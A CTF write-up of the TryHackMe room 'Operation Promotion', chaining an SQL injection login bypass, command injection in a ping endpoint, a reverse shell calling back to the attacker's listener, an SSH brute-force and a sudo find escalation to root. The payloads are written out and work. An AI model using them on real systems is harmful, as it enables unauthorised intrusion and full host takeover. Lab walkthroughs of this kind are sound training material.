# Operation Promotion — TryHackMe Writeup | fahisxd

Room link: https://tryhackme.com/room/operationpromotion

> Don't mind my English (it's purely from me T-T)

Target machine booted...
Attack box booted...
VPN connected...

---

## Reconnaissance

### Nmap Scan

first of all, let's run an Nmap scan

```bash
$ sudo nmap -sC -sV -Pn 10.48.136.103  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-25 08:00 EDT
Nmap scan report for 10.48.136.103
Host is up (0.046s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:25:9c:0d:64:05:c9:de:fe:4c:6f:aa:05:62:cf:f4 (ECDSA)
|_  256 d5:ae:30:e0:49:ec:db:6e:11:79:85:9d:f5:ca:a1:4e (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitCorp - Careers Portal
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.58 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

then, let's check out the web

![RecruitCorp careers portal homepage](images/02-website-homepage.png)

nothing spicy here, let's run a dir scan

```
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.48.136.103/admin/]
/config               (Status: 403) [Size: 278]
Progress: 9074 / 20481 (44.30%)
```

mmm... lessseee what's in the `/admin` page

cute, a login page TvT

---

## Initial Access

o wow, this was enough to log in:

```
' OR 1=1--
```

a simple SQLi

how did it work: the SQL query would've been something like

```sql
SELECT user FROM users WHERE username = 'user_input' AND password = 'user_input';
```

but when a SQLi payload like `' OR 1=1--` is entered, it becomes something like

```sql
SELECT user FROM users WHERE username = '' OR 1=1--' AND password = 'user_input';
```

the part after `--` gets commented out, and since `1=1` is always true, the login gets bypassed.

![Admin login bypassed with SQLi](images/03-admin-login-bypass.png)

okk, the admin page has a function called **user lookup**, probably for viewing user profiles.

---

## Enumeration via User Lookup

![User lookup - ID 1 (admin) and ID 2 (mvasquez)](images/04-userlookup-id1-id2.png)

![User lookup - ID 3 (tparker)](images/05-userlookup-id3.png)

on user ID 7, there's an endpoint mentioned: `/admin/sysmaint-checks/ping.php`

![User lookup - ID 7 (sysmaint service account)](images/06-userlookup-id7-sysmaint.png)

while i was analyzing this, the Gobuster scan finished and revealed:

```
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.48.136.103/admin/]
/config               (Status: 403) [Size: 278]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 278]
Progress: 20481 / 20481 (100.00%)
```

`/robots.txt`, let's check that out!

but it only showed the `/admin` endpoint, nothing cheesy

okk, back to the ping endpoint

---

## Foothold — Command Injection

okay, we managed to get command injection through the ping endpoint

![Ping endpoint responding to host parameter](images/07-ping-endpoint-basic.png)

```
http://10.48.136.103/admin/sysmaint-checks/ping.php?host=8.8.8.8%3Bid
```

![Command injection confirmed - id output shows www-data](images/08-ping-endpoint-injection-id.png)

Got the listener on

```bash
$ nc -lvnp 4444
```

and the payload

```
;bash+-c+"bash+-i+>%26+/dev/tcp/<IP>/4444+0>%26+1"
```

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.48.136.103 54294
bash: cannot set terminal process group (885): Inappropriate ioctl for device
bash: no job control in this shell
www-data@recruitcorp:/var/www/html/admin/sysmaint-checks$ 
```

**WE GOT IN!**

now we're going to try logging into `jford`, since the `ubuntu` user doesn't have any flag or some delulu stuff

but... how? was the question

---

## Privilege Escalation — jford

### Building the Wordlist

we're going to use:

```
EMEA
AMER
APAC
recruitcorp.thm
Spring2026
talent2019
```

For generating a word-list for our ssh brute-force

```bash
$ hashcat --stdout pass.txt -r /usr/share/hashcat/rules/dive.rule > jfordpasslist.txt
```

okk, now SSH brute-force T-T

### SSH Brute-Force (Hydra)

we're gonna use Hydra, ofc

okk, this took forever...

but we **GOT it**

![Hydra successful SSH brute-force result for jford](images/09-hydra-success.png)

### user.txt

Okk `user.txt` submitted

![TryHackMe answer form - user.txt submitted correctly](images/10-userflag-submitted.png)

now...

---

## Privilege Escalation — root

the `jford` user can run `find` with `sudo`, which means we can use this payload:

```bash
$ sudo /usr/bin/find . -exec /bin/sh -p \; -quit
```

By this i got **root shell**

```bash
# whoami
root
```

### flag.txt

![TryHackMe answer form - flag.txt submitted correctly](images/11-rootflag-submitted.png)

andddd thats **Operation Promotion** rooted :)

nice little chain from SQLi all the way to root T-T
